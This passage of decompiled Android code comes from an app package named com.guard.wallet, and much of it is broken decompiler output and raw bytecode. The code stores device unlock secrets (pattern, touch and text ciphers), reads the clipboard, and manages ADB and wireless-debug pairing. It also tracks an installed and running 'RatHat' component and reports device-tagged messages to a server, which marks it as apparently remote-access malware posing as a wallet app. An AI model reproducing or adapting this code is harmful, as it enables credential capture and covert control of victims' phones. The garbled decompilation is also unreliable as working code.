      // 03: ldc_w "batteryPercent"
      // 06: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 09: ifne 41
      // 0c: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0f: ifnull 41
      // 12: invokestatic com/guard/wallet/utils/h.s ()Z
      // 15: istore 1
      // 16: iload 1
      // 17: ifeq 41
      // 1a: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 1d: ldc_w "batteryPercent"
      // 20: bipush 0
      // 21: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 24: astore 2
      // 25: aload 2
      // 26: ifnull 41
      // 29: aload 2
      // 2a: ldc_w "batteryPercent"
      // 2d: fconst_0
      // 2e: invokeinterface android/content/SharedPreferences.getFloat (Ljava/lang/String;F)F 3
      // 33: fstore 0
      // 34: ldc com/guard/wallet/utils/h
      // 36: monitorexit
      // 37: fload 0
      // 38: freturn
      // 39: astore 2
      // 3a: ldc_w "SharedUtils"
      // 3d: aload 2
      // 3e: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 41: ldc com/guard/wallet/utils/h
      // 43: monitorexit
      // 44: fconst_0
      // 45: freturn
      // 46: astore 2
      // 47: ldc com/guard/wallet/utils/h
      // 49: monitorexit
      // 4a: aload 2
      // 4b: athrow
   }

   public static int i(String param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: aload 0
      // 04: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 07: ifne 3b
      // 0a: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0d: ifnull 3b
      // 10: invokestatic com/guard/wallet/utils/h.s ()Z
      // 13: istore 2
      // 14: iload 2
      // 15: ifeq 3b
      // 18: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 1b: aload 0
      // 1c: bipush 0
      // 1d: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 20: astore 3
      // 21: aload 3
      // 22: ifnull 3b
      // 25: aload 3
      // 26: aload 0
      // 27: bipush -1
      // 28: invokeinterface android/content/SharedPreferences.getInt (Ljava/lang/String;I)I 3
      // 2d: istore 1
      // 2e: ldc com/guard/wallet/utils/h
      // 30: monitorexit
      // 31: iload 1
      // 32: ireturn
      // 33: astore 0
      // 34: ldc_w "SharedUtils"
      // 37: aload 0
      // 38: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 3b: ldc com/guard/wallet/utils/h
      // 3d: monitorexit
      // 3e: bipush -1
      // 3f: ireturn
      // 40: astore 0
      // 41: ldc com/guard/wallet/utils/h
      // 43: monitorexit
      // 44: aload 0
      // 45: athrow
   }

   public static long j(String param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: aload 0
      // 04: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 07: ifne 3e
      // 0a: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0d: ifnull 3e
      // 10: invokestatic com/guard/wallet/utils/h.s ()Z
      // 13: istore 1
      // 14: iload 1
      // 15: ifeq 3e
      // 18: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 1b: aload 0
      // 1c: bipush 0
      // 1d: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 20: astore 4
      // 22: aload 4
      // 24: ifnull 3e
      // 27: aload 4
      // 29: aload 0
      // 2a: lconst_0
      // 2b: invokeinterface android/content/SharedPreferences.getLong (Ljava/lang/String;J)J 4
      // 30: lstore 2
      // 31: ldc com/guard/wallet/utils/h
      // 33: monitorexit
      // 34: lload 2
      // 35: lreturn
      // 36: astore 0
      // 37: ldc_w "SharedUtils"
      // 3a: aload 0
      // 3b: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 3e: ldc com/guard/wallet/utils/h
      // 40: monitorexit
      // 41: lconst_0
      // 42: lreturn
      // 43: astore 0
      // 44: ldc com/guard/wallet/utils/h
      // 46: monitorexit
      // 47: aload 0
      // 48: athrow
   }

   public static PowerControlStateVO k(String param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: aload 0
      // 01: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 04: ifne 42
      // 07: ldc_w com/guard/wallet/resp/PowerControlStateVO
      // 0a: monitorenter
      // 0b: ldc_w "powerControlState:"
      // 0e: aload 0
      // 0f: invokevirtual java/lang/String.concat (Ljava/lang/String;)Ljava/lang/String;
      // 12: invokestatic com/guard/wallet/utils/h.l (Ljava/lang/String;)Ljava/lang/String;
      // 15: astore 0
      // 16: aload 0
      // 17: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 1a: ifne 34
      // 1d: new com/guard/wallet/utils/SharedUtils$4
      // 20: astore 1
      // 21: aload 1
      // 22: invokespecial com/guard/wallet/utils/SharedUtils$4.<init> ()V
      // 25: aload 0
      // 26: aload 1
      // 27: invokestatic com/guard/wallet/utils/h.c (Ljava/lang/String;Lcom/google/json/reflect/TypeToken;)Ljava/lang/Object;
      // 2a: checkcast com/guard/wallet/resp/PowerControlStateVO
      // 2d: astore 0
      // 2e: ldc_w com/guard/wallet/resp/PowerControlStateVO
      // 31: monitorexit
      // 32: aload 0
      // 33: areturn
      // 34: ldc_w com/guard/wallet/resp/PowerControlStateVO
      // 37: monitorexit
      // 38: goto 42
      // 3b: astore 0
      // 3c: ldc_w com/guard/wallet/resp/PowerControlStateVO
      // 3f: monitorexit
      // 40: aload 0
      // 41: athrow
      // 42: new com/guard/wallet/resp/PowerControlStateVO
      // 45: dup
      // 46: invokespecial com/guard/wallet/resp/PowerControlStateVO.<init> ()V
      // 49: areturn
   }

   public static String l(String param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: aload 0
      // 04: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 07: ifne 3b
      // 0a: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0d: ifnull 3b
      // 10: invokestatic com/guard/wallet/utils/h.s ()Z
      // 13: istore 1
      // 14: iload 1
      // 15: ifeq 3b
      // 18: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 1b: aload 0
      // 1c: bipush 0
      // 1d: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 20: astore 2
      // 21: aload 2
      // 22: ifnull 3b
      // 25: aload 2
      // 26: aload 0
      // 27: aconst_null
      // 28: invokeinterface android/content/SharedPreferences.getString (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String; 3
      // 2d: astore 0
      // 2e: ldc com/guard/wallet/utils/h
      // 30: monitorexit
      // 31: aload 0
      // 32: areturn
      // 33: astore 0
      // 34: ldc_w "SharedUtils"
      // 37: aload 0
      // 38: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 3b: ldc com/guard/wallet/utils/h
      // 3d: monitorexit
      // 3e: aconst_null
      // 3f: areturn
      // 40: astore 0
      // 41: ldc com/guard/wallet/utils/h
      // 43: monitorexit
      // 44: aload 0
      // 45: athrow
   }

   public static String m() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: ldc_w "systemLangCode"
      // 06: invokestatic com/guard/wallet/utils/h.l (Ljava/lang/String;)Ljava/lang/String;
      // 09: astore 0
      // 0a: ldc com/guard/wallet/utils/h
      // 0c: monitorexit
      // 0d: aload 0
      // 0e: areturn
      // 0f: astore 0
      // 10: ldc com/guard/wallet/utils/h
      // 12: monitorexit
      // 13: aload 0
      // 14: athrow
   }

   public static boolean n() {
      return t(f());
   }

   public static boolean o() {
      return t(g());
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void p() {
      synchronized (ADBConfig.class){} // $VF: monitorenter 

      Throwable var10000;
      label393: {
         ADBConfig var2;
         try {
            var2 = J();
         } catch (Throwable var58) {
            var10000 = var58;
            boolean var10001 = false;
            break label393;
         }

         byte var1 = 0;

         byte var0;
         label384: {
            label383: {
               try {
                  var2.setConnected(false);
                  var2.setConnectedDevice(null);
                  var2.setConnectErrorCount(0);
                  var2.setInstalledRatHat(-1);
                  var2.setIsRatHatRunning(-1);
                  if (g.K()) {
                     break label383;
                  }
               } catch (Throwable var57) {
                  var10000 = var57;
                  boolean var62 = false;
                  break label393;
               }

               var0 = 0;
               break label384;
            }

            var0 = 1;
         }

         label376: {
            label375: {
               try {
                  var2.setEnableDevelopment(var0);
                  if (g.I()) {
                     break label375;
                  }
               } catch (Throwable var56) {
                  var10000 = var56;
                  boolean var63 = false;
                  break label393;
               }

               var0 = 0;
               break label376;
            }

            var0 = 1;
         }

         try {
            var2.setEnableDebug(var0);
         } catch (Throwable var55) {
            var10000 = var55;
            boolean var64 = false;
            break label393;
         }

         var0 = var1;

         label364: {
            try {
               if (!g.J()) {
                  break label364;
               }
            } catch (Throwable var54) {
               var10000 = var54;
               boolean var65 = false;
               break label393;
            }

            var0 = 1;
         }

         label359:
         try {
            var2.setEnableWifiDebug(var0);
            D(N(var2), "ADBConfig");
            // $VF: monitorexit
            return;
         } catch (Throwable var53) {
            var10000 = var53;
            boolean var66 = false;
            break label359;
         }
      }

      while (true) {
         Throwable var61 = var10000;

         try {
            // $VF: monitorexit
            throw var61;
         } catch (Throwable var52) {
            var10000 = var52;
            boolean var67 = false;
            continue;
         }
      }
   }

   public static boolean q() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: ldc com/guard/wallet/utils/h
      // 05: monitorenter
      // 06: ldc_w "isFirstOpenAccessibility"
      // 09: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 0c: istore 1
      // 0d: bipush 1
      // 0e: istore 2
      // 0f: iload 1
      // 10: ifne 53
      // 13: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 16: ifnull 53
      // 19: invokestatic com/guard/wallet/utils/h.s ()Z
      // 1c: istore 1
      // 1d: iload 1
      // 1e: ifeq 53
      // 21: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 24: ldc_w "isFirstOpenAccessibility"
      // 27: bipush 0
      // 28: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 2b: astore 3
      // 2c: aload 3
      // 2d: ifnull 43
      // 30: aload 3
      // 31: ldc_w "isFirstOpenAccessibility"
      // 34: invokeinterface android/content/SharedPreferences.contains (Ljava/lang/String;)Z 2
      // 39: istore 1
      // 3a: iload 1
      // 3b: ifeq 43
      // 3e: bipush 1
      // 3f: istore 0
      // 40: goto 45
      // 43: bipush 0
      // 44: istore 0
      // 45: ldc com/guard/wallet/utils/h
      // 47: monitorexit
      // 48: goto 58
      // 4b: astore 3
      // 4c: ldc_w "SharedUtils"
      // 4f: aload 3
      // 50: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 53: ldc com/guard/wallet/utils/h
      // 55: monitorexit
      // 56: bipush 0
      // 57: istore 0
      // 58: iload 2
      // 59: istore 1
      // 5a: iload 0
      // 5b: ifeq 6e
      // 5e: ldc_w "isFirstOpenAccessibility"
      // 61: invokestatic com/guard/wallet/utils/h.e (Ljava/lang/String;)Z
      // 64: ifeq 6c
      // 67: iload 2
      // 68: istore 1
      // 69: goto 6e
      // 6c: bipush 0
      // 6d: istore 1
      // 6e: ldc com/guard/wallet/utils/h
      // 70: monitorexit
      // 71: iload 1
      // 72: ireturn
      // 73: astore 3
      // 74: ldc com/guard/wallet/utils/h
      // 76: monitorexit
      // 77: aload 3
      // 78: athrow
      // 79: astore 3
      // 7a: ldc com/guard/wallet/utils/h
      // 7c: monitorexit
      // 7d: aload 3
      // 7e: athrow
   }

   public static boolean r(String var0) {
      boolean var3 = q.B(var0);
      boolean var2 = false;
      boolean var1 = var2;
      if (!var3) {
         PowerControlStateVO var4 = k(var0);
         var1 = var2;
         if (var4 != null) {
            var1 = var2;
            if (var4.getAllowAllFullBackground()) {
               var1 = var2;
               if (var4.getAllowAutoStart()) {
                  var1 = true;
               }
            }
         }
      }

      return var1;
   }

   public static boolean s() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 06: ifnull 30
      // 09: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0c: ldc_w "user"
      // 0f: invokevirtual android/content/Context.getSystemService (Ljava/lang/String;)Ljava/lang/Object;
      // 12: checkcast android/os/UserManager
      // 15: astore 1
      // 16: aload 1
      // 17: ifnull 30
      // 1a: aload 1
      // 1b: invokevirtual android/os/UserManager.isUserUnlocked ()Z
      // 1e: istore 0
      // 1f: iload 0
      // 20: ifeq 30
      // 23: ldc com/guard/wallet/utils/h
      // 25: monitorexit
      // 26: bipush 1
      // 27: ireturn
      // 28: astore 1
      // 29: ldc_w "SharedUtils"
      // 2c: aload 1
      // 2d: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 30: ldc com/guard/wallet/utils/h
      // 32: monitorexit
      // 33: bipush 0
      // 34: ireturn
      // 35: astore 1
      // 36: ldc com/guard/wallet/utils/h
      // 38: monitorexit
      // 39: aload 1
      // 3a: athrow
   }

   public static boolean t(ReqUnlockDeviceVO var0) {
      boolean var3 = false;
      boolean var4 = false;
      boolean var2 = false;
      boolean var1 = var4;
      if (var0 != null) {
         if (Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            var1 = var2;
            if (var0.getTouchCipher() != null) {
               var1 = var2;
               if (!var0.getTouchCipher().isEmpty()) {
                  var1 = true;
               }
            }

            return var1;
         }

         if (Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
            var1 = var3;
            if (var0.getPatternCipher() != null) {
               var1 = var3;
               if (!var0.getPatternCipher().isEmpty()) {
                  var1 = true;
               }
            }

            return var1;
         }

         var1 = var4;
         if (!q.B(var0.getTextCipher())) {
            var1 = var4;
            if (!q.B(var0.getCipherGradeCode())) {
               var1 = true;
            }
         }
      }

      return var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static String u() {
      if (g.Z() != null) {
         Exception var10000;
         label69: {
            ClipboardManager var0;
            try {
               var0 = (ClipboardManager)g.Z().getSystemService("clipboard");
            } catch (Exception var6) {
               var10000 = var6;
               boolean var10001 = false;
               break label69;
            }

            if (var0 == null) {
               return null;
            }

            Item var1;
            try {
               if (var0.getPrimaryClip() == null) {
                  return null;
               }

               var1 = var0.getPrimaryClip().getItemAt(0);
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10 = false;
               break label69;
            }

            if (var1 == null) {
               return null;
            }

            try {
               if (var1.getText() != null) {
                  return var1.getText().toString();
               }
            } catch (Exception var7) {
               var10000 = var7;
               boolean var11 = false;
               break label69;
            }

            try {
               var8 = var1.getUri();
            } catch (Exception var4) {
               var10000 = var4;
               boolean var12 = false;
               break label69;
            }

            if (var8 != null) {
               try {
                  if (!q.B(var8.toString())) {
                     return var8.toString();
                  }
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var13 = false;
                  break label69;
               }
            }

            try {
               if (!q.B(var1.getHtmlText())) {
                  return var1.getHtmlText();
               }

               return null;
            } catch (Exception var2) {
               var10000 = var2;
               boolean var14 = false;
            }
         }

         Exception var9 = var10000;
         q.s("com.guard.wallet.utils.h", var9);
      }

      return null;
   }

   public static boolean v(MessageRecordVO var0) {
      String var2 = l("deviceId");
      if (!q.B(var2)) {
         var0.setDeviceId(var2);
         ReqMessageVO var1 = new ReqMessageVO();
         var1.setDeviceId(var2);
         var1.setIntentCode(var0.getIntentCode());
         if (var0.getExtraBody() != null) {
            var1.setExtraBody(N(var0.getExtraBody()));
         }

         LinkedList var3 = new LinkedList();
         var3.add(var1);
         ApiRequest var6 = new ApiRequest();
         var6.setData(var3);
         JsonObject var7 = l.q(var6, l.a);
         if (var7 != null) {
            MessageUtils$1 var4 = new MessageUtils$1();
            ApiResult var5 = (ApiResult)c(var7.toString(), var4);
            if (var5 != null && var5.getSuccess() && (Boolean)var5.getData()) {
               Log.d("MessageUtils", "同步向服务器提交消息成功");
               return true;
            }
         }
      }

      return false;
   }

   public static void w(String param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: aload 0
      // 04: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 07: ifne 49
      // 0a: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0d: ifnull 49
      // 10: invokestatic com/guard/wallet/utils/h.s ()Z
      // 13: istore 1
      // 14: iload 1
      // 15: ifeq 49
      // 18: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 1b: aload 0
      // 1c: bipush 0
      // 1d: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 20: astore 2
      // 21: aload 2
      // 22: ifnull 49
      // 25: aload 2
      // 26: invokeinterface android/content/SharedPreferences.edit ()Landroid/content/SharedPreferences$Editor; 1
      // 2b: astore 2
      // 2c: aload 2
      // 2d: ifnull 49
      // 30: aload 2
      // 31: aload 0
      // 32: invokeinterface android/content/SharedPreferences$Editor.remove (Ljava/lang/String;)Landroid/content/SharedPreferences$Editor; 2
      // 37: pop
      // 38: aload 2
      // 39: invokeinterface android/content/SharedPreferences$Editor.apply ()V 1
      // 3e: goto 49
      // 41: astore 0
      // 42: ldc_w "SharedUtils"
      // 45: aload 0
      // 46: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 49: ldc com/guard/wallet/utils/h
      // 4b: monitorexit
      // 4c: return
      // 4d: astore 0
      // 4e: ldc com/guard/wallet/utils/h
      // 50: monitorexit
      // 51: aload 0
      // 52: athrow
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void x(CheckPortResult var0) {
      synchronized (ADBConfig.class){} // $VF: monitorenter 

      Throwable var10000;
      label223: {
         ADBConfig var2;
         try {
            var2 = J();
            if (!Objects.equals(var0.getDebugPort(), var2.getDebugPort())) {
               var2.setDebugPort(var0.getDebugPort());
               if (MainApplication.getInstance() != null) {
                  MainApplication.getInstance().rewriteDebugPort(var0.getDebugPort());
               }
            }
         } catch (Throwable var32) {
            var10000 = var32;
            boolean var10001 = false;
            break label223;
         }

         try {
            if (!q.B(var0.getConnectedDevice())) {
               var2.setConnectedDevice(var0.getConnectedDevice());
            }
         } catch (Throwable var31) {
            var10000 = var31;
            boolean var34 = false;
            break label223;
         }

         try {
            var2.setConnected(var0.isConnected());
            Date var1 = new Date();
            var2.setUpdateTime(var1.getTime());
            if (var0.isConnected() && g.J()) {
               var2.setPaired(true);
            }
         } catch (Throwable var30) {
            var10000 = var30;
            boolean var35 = false;
            break label223;
         }

         label210:
         try {
            D(N(var2), "ADBConfig");
            l.p(var2);
            // $VF: monitorexit
            return;
         } catch (Throwable var29) {
            var10000 = var29;
            boolean var36 = false;
            break label210;
         }
      }

      while (true) {
         Throwable var33 = var10000;

         try {
            // $VF: monitorexit
            throw var33;
         } catch (Throwable var28) {
            var10000 = var28;
            boolean var37 = false;
            continue;
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void y(PairResponseVO var0) {
      synchronized (ADBConfig.class){} // $VF: monitorenter 

      Throwable var10000;
      label111: {
         try {
            ADBConfig var1 = J();
            var1.setPaired(var0.isPaired());
            if (var0.getDebugPort() != null && var0.getDebugPort() > 0) {
               var1.setConnected(var0.isConnected());
               if (!Objects.equals(var0.getDebugPort(), var1.getDebugPort())) {
                  var1.setDebugPort(var0.getDebugPort());
                  if (MainApplication.getInstance() != null) {
                     MainApplication.getInstance().rewriteDebugPort(var0.getDebugPort());
                  }
               }
            }

            Date var14 = new Date();
            var1.setUpdateTime(var14.getTime());
            D(N(var1), "ADBConfig");
            l.p(var1);
            // $VF: monitorexit
         } catch (Throwable var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label111;
         }

         label108:
         try {
            return;
         } catch (Throwable var12) {
            var10000 = var12;
            boolean var16 = false;
            break label108;
         }
      }

      while (true) {
         Throwable var15 = var10000;

         try {
            // $VF: monitorexit
            throw var15;
         } catch (Throwable var11) {
            var10000 = var11;
            boolean var17 = false;
            continue;
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void z(boolean var0) {
      synchronized (ADBConfig.class){} // $VF: monitorenter 

      Throwable var10000;
      label97: {
         ADBConfig var2;
         try {
            var2 = J();
         } catch (Throwable var15) {
            var10000 = var15;
            boolean var10001 = false;
            break label97;
         }

         byte var1;
         if (var0) {
            var1 = 1;
         } else {
            var1 = 0;
         }

         label89:
         try {
            var2.setInstalledRatHat(var1);
            Date var3 = new Date();
            var2.setUpdateTime(var3.getTime());
            D(N(var2), "ADBConfig");
            // $VF: monitorexit
            return;
         } catch (Throwable var14) {
            var10000 = var14;
            boolean var17 = false;
            break label89;
         }
      }

      while (true) {
         Throwable var16 = var10000;

         try {
            // $VF: monitorexit
            throw var16;
         } catch (Throwable var13) {
            var10000 = var13;
            boolean var18 = false;
            continue;
         }
      }
   }
}
